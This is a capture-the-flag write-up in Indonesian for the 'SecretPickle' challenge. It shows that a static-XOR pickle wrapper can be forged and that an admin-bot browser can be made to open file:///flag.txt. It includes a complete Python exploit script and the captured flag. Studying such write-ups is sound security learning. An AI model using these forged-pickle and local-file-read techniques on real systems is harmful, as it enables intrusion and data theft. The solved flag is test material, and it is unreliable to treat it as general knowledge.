# SecretPickle - Writeup

## Ringkasan

Challenge ini terlihat seperti memakai "encrypted pickle", tapi implementasinya sebenarnya sangat lemah:

- `secretpickle_dump()` hanya melakukan XOR dengan key statis.
- `secretpickle_load()` membalik XOR lalu langsung memanggil `pickle.loads()`.

Artinya, payload pickle masih bisa dibuat secara bebas. Begitu format XOR-nya dipahami, kita bisa mengirim pickle buatan sendiri ke server.

Solusi akhirnya tidak perlu RCE yang rumit. Jalur paling sederhana adalah memakai fitur `adminbot` untuk meminta browser admin membuka `file:///flag.txt`, lalu membaca flag dari screenshot yang dikembalikan.

## Analisis Source

File penting:

- [`app/secretpickle.py`](app/secretpickle.py)
- [`app/server.py`](app/server.py)
- [`app/adminbot.py`](app/adminbot.py)

### 1. Format "secretpickle"

Di [`app/secretpickle.py`](app/secretpickle.py), formatnya:

```python
decoded = base64.b64decode(encoded)
xored = secretpickle_encrypt(decoded)
untrimmed = SECRETPICKLE_OBJECT_PREFIX + xored
raw = decoder(untrimmed)
```

Masalahnya:

- key XOR hardcoded dan publik
- prefix pickle juga hardcoded
- hasil akhirnya tetap `pickle.loads()`

Jadi payload yang dikirim tetap bisa mengandung opcode pickle apa pun, selama bagian tail-nya dibentuk dengan benar.

### 2. Endpoint adminbot

Di [`app/server.py`](app/server.py), action `adminbot`:

```python
url = base64.b64decode(params["url"]).decode()
adminbot_url = f"http://{ADMINBOT_HOST}:{ADMINBOT_PORT}/visit?url={quote(url)}"
```

Server hanya meneruskan URL ke service adminbot.

Di [`app/adminbot.py`](app/adminbot.py), browser admin:

1. register akun `admin` dengan password flag
2. login
3. membuka URL yang kita kirim
4. mengambil screenshot halaman terakhir

Ini penting, karena browser admin berjalan di container adminbot yang punya `/flag.txt`.

## Eksploitasi

### Langkah 1: Bangun payload pickle

Tujuannya bukan RCE di server utama, tapi memanfaatkan action `adminbot` agar browser admin membuka file lokal:

```text
file:///flag.txt
```

Payload request tetap harus dibungkus ke format `secretpickle`.

### Langkah 2: Encode URL tujuan

URL dibungkus base64 dulu karena field `params.url` memang expect base64.

Contoh:

```python
inner = base64.b64encode(b"file:///flag.txt").decode()
```

### Langkah 3: Kirim ke server

Secara lokal saya generate pickle dict:

```python
pl = {
    "action": "adminbot",
    "params": {"url": inner}
}
```

Lalu:

1. `pickle.dumps(pl, protocol=4)`
2. ambil tail setelah prefix `SECRETPICKLE_OBJECT_PREFIX`
3. XOR dengan key `SECRETPICKLE_XOR_KEY`
4. base64 encode hasilnya
5. POST ke `/<payload>`

### Langkah 4: Decode respons

Server mengembalikan respons yang juga dibungkus `secretpickle`.

Setelah didecode, respons berisi HTML yang memuat screenshot adminbot dalam bentuk data URI PNG.

Screenshot tersebut menampilkan isi `/flag.txt`.

## Payload Generator

Script yang dipakai:

```python
import base64
import pickle
import sys
import urllib.request

sys.path.insert(0, "app")
from secretpickle import secretpickle_encrypt, secretpickle_load, SECRETPICKLE_OBJECT_PREFIX

url = "file:///flag.txt"
inner = base64.b64encode(url.encode()).decode()
pl = {"action": "adminbot", "params": {"url": inner}}

raw = pickle.dumps(pl, protocol=4)
body = raw[len(SECRETPICKLE_OBJECT_PREFIX):]
encoded = base64.b64encode(secretpickle_encrypt(body)).decode()

req = urllib.request.Request(
    "https://steamed-filet-infused-with-whipped-soy-foam-okgv.gpn24.ctf.kitctf.de/" + encoded,
    method="POST",
)
with urllib.request.urlopen(req, timeout=60) as resp:
    data = resp.read().decode().strip()

res = secretpickle_load(data)
print(res)
```

## Flag

`GPNCTF{the_picK13_W4s_SeCReT_Bu7_nEvEr_SEcurE}`

## Kenapa Ini Bisa Jalan

Inti bug-nya ada di dua tempat:

- "enkripsi" pickle cuma XOR statis, jadi tidak ada proteksi nyata
- adminbot menerima URL bebas, lalu browser-nya membuka URL itu dengan akses ke file lokal container adminbot

Jadi challenge ini sebenarnya gabungan dari:

- reversible custom pickle wrapper
- browser automation yang terlalu permisif

